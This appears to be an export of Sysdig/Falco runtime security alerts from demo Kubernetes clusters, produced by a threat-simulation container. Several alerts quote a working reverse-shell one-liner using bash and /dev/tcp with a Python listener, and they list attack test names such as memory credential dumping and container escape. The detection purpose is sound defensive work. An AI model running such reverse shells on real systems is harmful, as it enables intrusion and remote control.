{"id":"17dec715376910362c8c3f62a4ceda2e","type":"policy","timestamp":1720031001639981110,"timestampRFC3339Nano":"2024-07-03T18:23:21.63998111Z","originator":"policy","category":"runtime","source":"syscall","name":"Sysdig Runtime Activity Logs","description":"This policy contains rules which provide a greater insight into general activities occuring on the system. They are very noisy, but useful in threat hunting situations if you are looking for specific actions being taken during runtime. It is not recommended to use this policy for detection purposes unless tuning is enabled.  Additional manual tuning will likely be required.","severity":7,"agentId":58014837,"containerId":"6949e5f10829","machineId":"42:01:0a:80:00:05","hostMac":"42:01:0a:80:00:05","content":{"ruleName":"User Management Event Detected","ruleType":"RULE_TYPE_FALCO","ruleTags":["host","container","MITRE","MITRE_TA0003_persistence","MITRE_T1136_create_account","MITRE_T1136.001_create_account_local_account","MITRE_T1070_indicator_removal","MITRE_TA0005_defense_evasion","MITRE_TA0040_impact","MITRE_T1531_account_access_removal","MITRE_T1098_account_manipulation"],"output":"Users management command userdel tmp_suid_user launched by pwsh on threatgen under user root (proc.name=userdel proc.args=tmp_suid_user fd.name=\u003cNA\u003e proc.cmdline=pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PROG Base64.PYTHON BASE64.CLI CONNECT.UNEXPECTED RECON.GPG SUBTERFUGE.LASTLOG LD.LINUX.EXEC LD.SO.PRELOAD USERFAULTFD.HANDLER RECON.LINPEAS PROOT.EXEC) proc.pname=pwsh gparent=containerd-shim ggparent=\u003cNA\u003e gggparent=\u003cNA\u003e container=container_id=6949e5f10829 container_name=threatgen evt.type=execve evt.arg.request=\u003cNA\u003e proc.pid=2140169 proc.cwd=/tmp/ proc.ppid=2140088 proc.pcmdline=pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PROG Base64.PYTHON BASE64.CLI CONNECT.UNEXPECTED RECON.GPG SUBTERFUGE.LASTLOG LD.LINUX.EXEC LD.SO.PRELOAD USERFAULTFD.HANDLER RECON.LINPEAS PROOT.EXEC) proc.sid=1 proc.exepath=/usr/sbin/userdel user.uid=0 user.loginuid=-1 user.loginname=\u003cNA\u003e user.name=root group.gid=0 group.name=root container.id=6949e5f10829 container.name=threatgen image=docker.io/dockerbadboy/art)","fields":{"container.name":"threatgen","proc.cmdline":"userdel tmp_suid_user","proc.cwd":"/tmp/","proc.exepath":"/usr/sbin/userdel","proc.name":"userdel","proc.pcmdline":"pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PROG Base64.PYTHON BASE64.CLI CONNECT.UNEXPECTED RECON.GPG SUBTERFUGE.LASTLOG LD.LINUX.EXEC LD.SO.PRELOAD USERFAULTFD.HANDLER RECON.LINPEAS PROOT.EXEC)","proc.pid":"2140169","proc.pname":"pwsh","proc.ppid":"2140088","user.name":"root","user.uid":"0"},"policyVersion":35,"policyOrigin":"Sysdig"},"labels":{"cloudProvider.account.id":"289645096542","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","gcp.availabilityZone":"us-central1-c","gcp.instanceId":"648229130641697246","gcp.instanceName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","gcp.machineType":"e2-standard-4","gcp.projectId":"289645096542","gcp.projectName":"alliances-chronicle","host.hostName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.namespace.name":"default","kubernetes.pod.name":"threatgen-c65cf6446-5s8kk","kubernetes.workload.type":"deployment"}}
{"id":"17dec7142e0084978fbafcb03e2cabca","type":"policy","timestamp":1720030997187167383,"timestampRFC3339Nano":"2024-07-03T18:23:17.187167383Z","originator":"policy","category":"runtime","source":"syscall","name":"Sysdig Runtime Notable Events","description":"This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.","severity":5,"agentId":58014837,"containerId":"6949e5f10829","machineId":"42:01:0a:80:00:05","hostMac":"42:01:0a:80:00:05","actions":[{"type":"","successful":false,"errMsg":"maximum number of outstanding captures (1) reached","token":"c708ed01-9700-4787-91a5-6b2fb9863c0a","afterEventNs":30000000000,"beforeEventNs":15000000000}],"content":{"ruleName":"Redirect STDOUT/STDIN to Network Connection in Container","ruleType":"RULE_TYPE_FALCO","ruleTags":["container","SOC2","SOC2_CC6.6","SOC2_CC6.7","NIST","NIST_800-53","NIST_800-53_AC-6(9)","NIST_800-53_AC-6(10)","NIST_800-53_AU-6(8)","HIPAA","HIPAA_164.308(a)","HIPAA_164.312(a)","HIPAA_164.312(b)","HITRUST","HITRUST_CSF","HITRUST_CSF_01.c","HITRUST_CSF_09.aa","MITRE","MITRE_TA0002_execution","MITRE_T1059_command_and_scripting_interpreter","MITRE_T1104_multi_stage_channels"],"output":"Redirect stdout/stdin to network connection by process bash with parent bash on threatgen under user root, possible reverse shell detected (fd.sip=127.0.0.1:8080 process=bash parent=bash gparent=pwsh ggparent=containerd-shim gggparent=\u003cNA\u003e container.id=6949e5f10829 image=docker.io/dockerbadboy/art fd.name=127.0.0.1:39552-\u003e127.0.0.1:8080 fd.num=1 fd.type=ipv4 cmdline=bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261 terminal=0  evt.type=dup2 evt.res=SUCCESS proc.pid=2140105 proc.cwd=/tmp/ proc.ppid=2140101 proc.pcmdline=bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261 proc.sid=1 proc.exepath=/usr/bin/bash user.uid=0 user.loginname=\u003cNA\u003e group.gid=0 group.name=root container.name=threatgen  user.name=root user.loginuid=-1 container_id=6949e5f10829 container_name=threatgen)","fields":{"container.name":"threatgen","proc.cmdline":"bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261","proc.cwd":"/tmp/","proc.exepath":"/usr/bin/bash","proc.name":"bash","proc.pcmdline":"bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261","proc.pid":"2140105","proc.pname":"bash","proc.ppid":"2140101","user.name":"root","user.uid":"0"},"policyVersion":90,"policyOrigin":"Sysdig"},"labels":{"cloudProvider.account.id":"289645096542","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","gcp.availabilityZone":"us-central1-c","gcp.instanceId":"648229130641697246","gcp.instanceName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","gcp.machineType":"e2-standard-4","gcp.projectId":"289645096542","gcp.projectName":"alliances-chronicle","host.hostName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.namespace.name":"default","kubernetes.pod.name":"threatgen-c65cf6446-5s8kk","kubernetes.workload.type":"deployment"}}
{"id":"17e04791d768c4aba1e9c40d944b8598","type":"policy","timestamp":1720453749365327019,"timestampRFC3339Nano":"2024-07-08T15:49:09.365327019Z","originator":"policy","category":"runtime","source":"syscall","name":"Sysdig Runtime Activity Logs","description":"This policy contains rules which provide a greater insight into general activities occuring on the system. They are very noisy, but useful in threat hunting situations if you are looking for specific actions being taken during runtime. It is not recommended to use this policy for detection purposes unless tuning is enabled.  Additional manual tuning will likely be required.","severity":7,"agentId":58462623,"containerId":"8736272bd5fb","machineId":"7c:1e:52:0b:2b:61","hostMac":"7c:1e:52:0b:2b:61","content":{"ruleName":"Drop and execute new binary in container","ruleType":"RULE_TYPE_FALCO","ruleTags":["container","MITRE","MITRE_T1525_implant_internal_image","MITRE_TA0003_persistence"],"output":"Executing binary ruby with parent livenessprobe.s not part of base image mcr.microsoft.com/azuremonitor/containerinsights/ciprod on ama-logs under user root and execution path /usr/bin/ruby (proc.name=ruby proc.pname=livenessprobe.s fd.name=\\u003cNA\\u003e proc.cmdline=ruby /opt/dcr-config-parser.rb proc.pcmdline=livenessprobe.s /opt/livenessprobe.sh gparent=runc ggparent=containerd-shim gggparent=systemd evt.type=execveproc.args=/opt/dcr-config-parser.rb proc.pid=2817268 proc.cwd=/opt/ proc.ppid=2817253 proc.exepath=/usr/bin/ruby user.uid=0 user.loginuid=-1 user.loginname=\\u003cNA\\u003e user.name=root group.gid=0 group.name=root container.id=8736272bd5fb container.name=ama-logs image=mcr.microsoft.com/azuremonitor/containerinsights/ciprod:3.1.21)","fields":{"container.name":"ama-logs","proc.cmdline":"ruby /opt/dcr-config-parser.rb","proc.cwd":"/opt/","proc.exepath":"/usr/bin/ruby","proc.name":"ruby","proc.pcmdline":"livenessprobe.s /opt/livenessprobe.sh","proc.pid":"2817268","proc.pname":"livenessprobe.s","proc.ppid":"2817253","user.name":"root","user.uid":"0"},"policyVersion":35,"policyOrigin":"Sysdig"},"labels":{"azure.instanceId":"ba53fc47-1119-4cbb-af2b-6d38b0e56160","azure.instanceName":"aks-userpool-12996081-vmss_1","azure.instanceSize":"Standard_D8ds_v5","cloudProvider.account.id":"7a100e05-8316-474d-99c0-b824d0e86366","cloudProvider.name":"azure","cloudProvider.region":"eastus","host.hostName":"aks-userpool-12996081-vmss000001","kubernetes.cluster.name":"servicenow-test-cluster","kubernetes.namespace.name":"kube-system","kubernetes.pod.name":"ama-logs-cxhbd","kubernetes.workload.type":"daemonset"}}
{"id":"17dec7142e00a9068fb9185f9aa66c21","type":"policy","timestamp":1720030997187176710,"timestampRFC3339Nano":"2024-07-03T18:23:17.18717671Z","originator":"policy","category":"runtime","source":"syscall","name":"Sysdig Runtime Notable Events","description":"This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.","severity":5,"agentId":58014837,"containerId":"6949e5f10829","machineId":"42:01:0a:80:00:05","hostMac":"42:01:0a:80:00:05","actions":[{"type":"","successful":false,"errMsg":"maximum number of outstanding captures (1) reached","token":"eb2b3e3c-ebc1-433f-88c7-2e032b75aadc","afterEventNs":30000000000,"beforeEventNs":15000000000}],"content":{"ruleName":"Redirect STDOUT/STDIN to Network Connection in Container","ruleType":"RULE_TYPE_FALCO","ruleTags":["container","SOC2","SOC2_CC6.6","SOC2_CC6.7","NIST","NIST_800-53","NIST_800-53_AC-6(9)","NIST_800-53_AC-6(10)","NIST_800-53_AU-6(8)","HIPAA","HIPAA_164.308(a)","HIPAA_164.312(a)","HIPAA_164.312(b)","HITRUST","HITRUST_CSF","HITRUST_CSF_01.c","HITRUST_CSF_09.aa","MITRE","MITRE_TA0002_execution","MITRE_T1059_command_and_scripting_interpreter","MITRE_T1104_multi_stage_channels"],"output":"Redirect stdout/stdin to network connection by process bash with parent bash on threatgen under user root, possible reverse shell detected (fd.sip=127.0.0.1:8080 process=bash parent=bash gparent=pwsh ggparent=containerd-shim gggparent=\u003cNA\u003e container.id=6949e5f10829 image=docker.io/dockerbadboy/art fd.name=127.0.0.1:39552-\u003e127.0.0.1:8080 fd.num=0 fd.type=ipv4 cmdline=bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261 terminal=0  evt.type=dup2 evt.res=SUCCESS proc.pid=2140105 proc.cwd=/tmp/ proc.ppid=2140101 proc.pcmdline=bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261 proc.sid=1 proc.exepath=/usr/bin/bash user.uid=0 user.loginname=\u003cNA\u003e group.gid=0 group.name=root container.name=threatgen  user.name=root user.loginuid=-1 container_id=6949e5f10829 container_name=threatgen)","fields":{"container.name":"threatgen","proc.cmdline":"bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261","proc.cwd":"/tmp/","proc.exepath":"/usr/bin/bash","proc.name":"bash","proc.pcmdline":"bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261","proc.pid":"2140105","proc.pname":"bash","proc.ppid":"2140101","user.name":"root","user.uid":"0"},"policyVersion":90,"policyOrigin":"Sysdig"},"labels":{"cloudProvider.account.id":"289645096542","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","gcp.availabilityZone":"us-central1-c","gcp.instanceId":"648229130641697246","gcp.instanceName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","gcp.machineType":"e2-standard-4","gcp.projectId":"289645096542","gcp.projectName":"alliances-chronicle","host.hostName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.namespace.name":"default","kubernetes.pod.name":"threatgen-c65cf6446-5s8kk","kubernetes.workload.type":"deployment"}}
{"id":"17dec36048564c002c559dbdad20be41","type":"policy","timestamp":1720026926000000000,"timestampRFC3339Nano":"2024-07-03T17:15:26Z","originator":"policy","category":"remote","source":"aws_cloudtrail","name":"Describe Instances - Sysdig AWS Activity Logs","description":"A description of an EC2 instance has been requested by user AutoScaling on region us-east-1 (requesting user=AutoScaling, requesting IP=autoscaling.amazonaws.com, account ID=414773805239, AWS region=us-east-1)","severity":7,"containerId":"","machineId":"","content":{"ruleName":"Describe Instances","ruleType":"RULE_TYPE_FALCO","ruleTags":["MITRE_T1082_system_information_discovery","Cloud","AWS","AWS_EC2","MITRE","MITRE_TA0007_discovery","MITRE_T1580_cloud_infrastructure_discovery"],"output":"A description of an EC2 instance has been requested by user AutoScaling on region us-east-1 (requesting user=AutoScaling, requesting IP=autoscaling.amazonaws.com, account ID=414773805239, AWS region=us-east-1)","fields":{"container.name":""},"policyVersion":36,"policyOrigin":"Sysdig"},"labels":{"cloudProvider.account.id":"414773805239","cloudProvider.name":"aws","cloudProvider.region":"us-east-1"}}
{"id":"17dec7142e051355585daf677e472ed2","type":"policy","timestamp":1720030997187466069,"timestampRFC3339Nano":"2024-07-03T18:23:17.187466069Z","originator":"policy","category":"runtime","source":"syscall","name":"Sysdig Runtime Notable Events","description":"This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.","severity":5,"agentId":58014837,"containerId":"6949e5f10829","machineId":"42:01:0a:80:00:05","hostMac":"42:01:0a:80:00:05","actions":[{"type":"","successful":false,"errMsg":"maximum number of outstanding captures (1) reached","token":"81618044-80a5-44af-b27a-46acead3a4bc","afterEventNs":30000000000,"beforeEventNs":15000000000}],"content":{"ruleName":"Privileged Shell Spawned Inside Container","ruleType":"RULE_TYPE_FALCO","ruleTags":["container","shell","SOC2","SOC2_CC6.1","PCI","PCI_DSS","PCI_DSS_10.1","PCI_DSS_10.2.1","NIST","NIST_800-171","NIST_800-171_3.1.1","NIST_800-171_3.1.2","NIST_800-171_3.14.6","NIST_800-171_3.3.1","NIST_800-171_3.3.2","NIST_800-53","NIST_800-53_AC-17","NIST_800-53_AU-6(8)","NIST_800-53_AU-2","NIST_800-53_AC-2(4)","FedRAMP","FedRAMP_AC-2(4)","FedRAMP_AU-2","ISO","ISO_27001","ISO_27001_A.9.4.4","HIPAA","HIPAA_164.308(a)","HIPAA_164.310(b)","HIPAA_164.312(a)","HIPAA_164.312(b)","HITRUST","HITRUST_CSF","HITRUST_CSF_01.i","HITRUST_CSF_01.j","HITRUST_CSF_01.n","HITRUST_CSF_01.p","HITRUST_CSF_01.s","HITRUST_CSF_01.y","HITRUST_CSF_06.i","HITRUST_CSF_09.aa","HITRUST_CSF_09.ab","HITRUST_CSF_09.ad","HITRUST_CSF_09.ae","HITRUST_CSF_09.m","HITRUST_CSF_09.s","GDPR","GDPR_32.1","GDPR_32.2","MITRE","MITRE_T1609_container_administration_command","MITRE_TA0002_execution","MITRE_TA0004_privilege_escalation","MITRE_T1068_exploitation_for_privilege_escalation","CIS"],"output":"Privileged Shell Spawned in Container threatgen with image docker.io/dockerbadboy/art by parent bash with cmdline bash -i under user root (user.uid=0 proc.cmdline=bash -i proc.name=bash proc.pname=bash gparent=pwsh ggparent=containerd-shim gggparent=\u003cNA\u003e proc.pcmdline=bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261 user.name=root user.loginuid=-1 proc.args=-i container.name=threatgen evt.type=execve evt.res=SUCCESS proc.pid=2140105 proc.cwd=/tmp/ proc.ppid=2140101 proc.sid=1 proc.exepath=/usr/bin/bash user.loginname=\u003cNA\u003e group.gid=0 group.name=root, container.image=docker.io/dockerbadboy/art)","fields":{"container.name":"threatgen","proc.cmdline":"bash -i","proc.cwd":"/tmp/","proc.exepath":"/usr/bin/bash","proc.name":"bash","proc.pcmdline":"bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261","proc.pid":"2140105","proc.pname":"bash","proc.ppid":"2140101","user.name":"root","user.uid":"0"},"policyVersion":90,"policyOrigin":"Sysdig"},"labels":{"cloudProvider.account.id":"289645096542","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","gcp.availabilityZone":"us-central1-c","gcp.instanceId":"648229130641697246","gcp.instanceName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","gcp.machineType":"e2-standard-4","gcp.projectId":"289645096542","gcp.projectName":"alliances-chronicle","host.hostName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.namespace.name":"default","kubernetes.pod.name":"threatgen-c65cf6446-5s8kk","kubernetes.workload.type":"deployment"}}
{"id":"17dec7142e03c2766a36e7950883c5c4","type":"policy","timestamp":1720030997187379830,"timestampRFC3339Nano":"2024-07-03T18:23:17.18737983Z","originator":"policy","category":"runtime","source":"syscall","name":"Sysdig Runtime Notable Events","description":"This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.","severity":5,"agentId":58014837,"containerId":"6949e5f10829","machineId":"42:01:0a:80:00:05","hostMac":"42:01:0a:80:00:05","actions":[{"type":"","successful":false,"errMsg":"maximum number of outstanding captures (1) reached","token":"35cf0ae3-a4ed-4c00-831f-f0b7c8489718","afterEventNs":30000000000,"beforeEventNs":15000000000}],"content":{"ruleName":"Redirect STDOUT/STDIN to Network Connection in Container","ruleType":"RULE_TYPE_FALCO","ruleTags":["container","SOC2","SOC2_CC6.6","SOC2_CC6.7","NIST","NIST_800-53","NIST_800-53_AC-6(9)","NIST_800-53_AC-6(10)","NIST_800-53_AU-6(8)","HIPAA","HIPAA_164.308(a)","HIPAA_164.312(a)","HIPAA_164.312(b)","HITRUST","HITRUST_CSF","HITRUST_CSF_01.c","HITRUST_CSF_09.aa","MITRE","MITRE_TA0002_execution","MITRE_T1059_command_and_scripting_interpreter","MITRE_T1104_multi_stage_channels"],"output":"Redirect stdout/stdin to network connection by process python3 with parent bash on threatgen under user root, possible reverse shell detected (fd.sip=127.0.0.1:8080 process=python3 parent=bash gparent=pwsh ggparent=containerd-shim gggparent=\u003cNA\u003e container.id=6949e5f10829 image=docker.io/dockerbadboy/art fd.name=127.0.0.1:39552-\u003e127.0.0.1:8080 fd.num=0 fd.type=ipv4 cmdline=python3 -c import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close(); terminal=0  evt.type=dup2 evt.res=SUCCESS proc.pid=2140103 proc.cwd=/tmp/ proc.ppid=2140101 proc.pcmdline=bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261 proc.sid=1 proc.exepath=/usr/bin/python3.10 user.uid=0 user.loginname=\u003cNA\u003e group.gid=0 group.name=root container.name=threatgen  user.name=root user.loginuid=-1 container_id=6949e5f10829 container_name=threatgen)","fields":{"container.name":"threatgen","proc.cmdline":"python3 -c import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();","proc.cwd":"/tmp/","proc.exepath":"/usr/bin/python3.10","proc.name":"python3","proc.pcmdline":"bash -c python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"127.0.0.1\",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' \u0026 sleep 1 \u0026\u0026 bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8080 0\u003e\u00261","proc.pid":"2140103","proc.pname":"bash","proc.ppid":"2140101","user.name":"root","user.uid":"0"},"policyVersion":90,"policyOrigin":"Sysdig"},"labels":{"cloudProvider.account.id":"289645096542","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","gcp.availabilityZone":"us-central1-c","gcp.instanceId":"648229130641697246","gcp.instanceName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","gcp.machineType":"e2-standard-4","gcp.projectId":"289645096542","gcp.projectName":"alliances-chronicle","host.hostName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.namespace.name":"default","kubernetes.pod.name":"threatgen-c65cf6446-5s8kk","kubernetes.workload.type":"deployment"}}
{"id":"17e047935c2a5c6118242ab739a6ba5e","type":"audittrail","timestamp":1720453755887574113,"timestampRFC3339Nano":"2024-07-08T15:49:15.887574113Z","originator":"ingestion","category":"","source":"auditTrail","name":"","description":"","severity":0,"containerId":"","machineId":""}
{"id":"17e047939adc188d8ee67f27d98a5929","type":"audittrail","timestamp":1720453756939409549,"timestampRFC3339Nano":"2024-07-08T15:49:16.939409549Z","originator":"ingestion","category":"","source":"auditTrail","name":"","description":"","severity":0,"containerId":"","machineId":""}
{"id":"17e047be24848be2ae63efba47ac8869","agentId":57228830,"containerId":"","type":"connection","timestamp":1720453939637554200,"timestampRFC3339Nano":"2024-07-08T15:52:19.637554146Z","labels":{"host.hostName":"gke-cluster-gcp-demo-san-default-pool-66250c41-mbxk"}}
{"id":"17dec38d1ccc838ed8bd3c0690c2a92e","agentId":57841425,"containerId":"","type":"connection","timestamp":1720027118543078400,"timestampRFC3339Nano":"2024-07-03T17:18:38.543078286Z","labels":{"host.hostName":"gke-gke-aliances-test-pa-default-pool-edcdf365-obof"}}
{"id":"17dec30f432914be51fde04f0a93ff8f","agentId":58462617,"containerId":"1eb848eba226","type":"command","timestamp":1720026578020799700,"timestampRFC3339Nano":"2024-07-03T17:09:38.020799678Z","labels":{"host.hostName":"aks-userpool-12996081-vmss000000","kubernetes.cluster.name":"servicenow-test-cluster","kubernetes.namespace.name":"default","kubernetes.pod.name":"playground-86dfdc6cb5-42xgq","kubernetes.workload.type":"deployment"}}
{"id":"17dec30ec6c62db90219722f069818ce","agentId":58462617,"containerId":"1eb848eba226","type":"command","timestamp":1720026575933943300,"timestampRFC3339Nano":"2024-07-03T17:09:35.933943225Z","labels":{"host.hostName":"aks-userpool-12996081-vmss000000","kubernetes.cluster.name":"servicenow-test-cluster","kubernetes.namespace.name":"default","kubernetes.pod.name":"playground-86dfdc6cb5-42xgq","kubernetes.workload.type":"deployment"}}
{"id":"17dec311bcc23cdab41a9d1b874f923f","agentId":58462617,"containerId":"1eb848eba226","type":"fileaccess","timestamp":1720026588650814700,"timestampRFC3339Nano":"2024-07-03T17:09:48.650814682Z","labels":{"host.hostName":"aks-userpool-12996081-vmss000000","kubernetes.cluster.name":"servicenow-test-cluster","kubernetes.namespace.name":"default","kubernetes.pod.name":"playground-86dfdc6cb5-42xgq","kubernetes.workload.type":"deployment"}}
{"id":"164806f4c47ad9101117d87f8b574ecf","agentId":32212,"containerId":"397be1762fba","name":"nginx-76f9cf7469-k5kf7","timestamp":1606322948648718268,"timestampRFC3339Nano":"2020-11-25T16:49:08.648718268Z","type":"kubernetes","labels":{"host.hostName":"qa-k8smetrics","kubernetes.cluster.name":"demo-env-prom","kubernetes.namespace.name":"nginx","kubernetes.pod.name":"nginx-76f9cf7469-k5kf7"}}